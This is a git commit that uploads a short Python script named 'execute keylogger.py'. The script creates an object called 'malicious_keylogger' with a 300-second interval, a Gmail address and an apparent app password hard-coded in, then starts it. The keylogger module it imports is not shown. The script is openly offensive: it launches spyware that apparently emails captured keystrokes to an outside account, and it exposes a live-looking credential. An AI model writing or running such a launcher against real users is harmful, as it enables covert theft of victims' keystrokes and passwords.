806255dc9d87bf8ac79231fe6d4127d3eafda917
athira kumari <110103428+Athira544@users.noreply.github.com>
2023-01-20 10:31:03 +0530

    Add files via upload

---
+++ execute keylogger.py
@@ -0,0 +1,7 @@
+import keylogger
+# Initialize / create keylogger
+import keylogger
+malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(300,'athirakumari567@gmail.com', 'piweceatkidpqovf')
+
+# Execute Keylogger
+malicious_keylogger.start()
